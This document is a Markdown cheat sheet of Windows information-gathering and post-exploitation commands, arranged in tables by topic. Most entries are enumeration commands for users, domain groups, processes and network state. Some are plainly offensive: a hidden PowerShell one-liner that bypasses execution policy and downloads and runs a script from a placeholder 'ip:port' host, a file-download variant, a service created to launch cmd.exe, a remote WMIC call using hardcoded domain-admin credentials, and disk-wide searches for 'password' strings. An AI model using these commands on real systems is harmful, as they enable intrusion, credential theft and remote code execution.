
# Information Gathering - Windows

## System Architecture

|**Command**|**Description**|
|:----------|:--------------|
|ver||
|systeminfo||
|wmic os list brief||

## Processes

|**Command**|**Description**|
|:----------|:--------------|
|tasklist<BR>tasklist /M<BR>tasklist /V||
|tasklist /FI "IMAGENAME eq cmd.exe"<BR>tasklist /FI "PID ne 0"||
|tasklist /S `SERVER` /U `DOMAIN\username` /P `password`|list processes in remote server|
|wmic process list brief|

## Users and Groups

|**Command**|**Description**|
|:----------|:--------------|
|net user||
|net user /domain||
|net localgroup administrators||
|net localgroup administrators /domain||
|net group /domain||
|net group "Domain Admins" /domain||
|net group "Domain Computers" /domain||
|net group "Domain Controllers" /domain||
|net group "Domain Policy Creator Owners" /domain||
|net accounts /domain||
|wmic useraccount||
|wmic useraccount LIST BRIEF||

## Services

|**Command**|**Description**|
|:----------|:--------------|
|sc query||
|sc create cmdsys type= own type= interact binPath= "c:\windows\system32\cmd.exe /c cmd.exe" & sc start cmdsys||

## Security

|**Command**|**Description**|
|:----------|:--------------|
|wmic qfe get hotfixid| Information about patches installed on the windows|


## Networking

|**Command**|**Description**|
|:----------|:--------------|
|ipconfig /all||
|ipconfig /displaydns||
|netstat -ano||
|netstat -ano -p tcp||
|netstat -ano -p udp||
|net view||
|net view /domain||
|net view /domain:`DOMAINNAME`|
|net view \\\\`domain-control`||
|wmic /node:DC1 /user:DOMAIN\domainadminsvc /password:domainadminsvc123 process call create "cmd /c vssadmin list shadows 2>&1 > c:\temp\output.txt"||
|powershell.exe -w hidden -nop -ep bypass -c "IEX ((new-object net.webclient).downloadstring('http://ip:port/[file]'))"||
|powershell.exe -w hidden -nop -ep bypass -c "(new-object net.webclient).DownloadFile('http://ip:port/file', 'C:\Windows\temp\testfile')"||


## File Systems

|**Command**|**Description**|
|:----------|:--------------|
|type C:\Windows\system32\demo.txt||
|dir /a|Displays files with specified attributes.|
|dir /s|Searches sub-directories|
|dir /s "\*`match-text`\*"|Searches for the word entered in the `match-text` section in all sub-dirs of the current directory.|
|find /I `password` C:\Windows\system32\*.ini||
|tree /F C:\Windows\system32||
|fsutil fsinfo drivers||
|wmic volume LIST BRIEF||
|wmic logicaldisk where drivetype=3 get name, freespace, systemname, filesystem, size, volumeserialnumber||
|net share||
|wmic share||
|net use \\\\`ip`\ipc$ `password` /user:`username`||
|FOR /F %f in ('dir /b /s C:\') do find /I "password" %f||




## Startup and Shutdown

|**Command**|**Description**|
|:----------|:--------------|
|wmic startup||

# Links

1. [Windows Internals Book](https://technet.microsoft.com/en-us/sysinternals/bb963901.aspx).
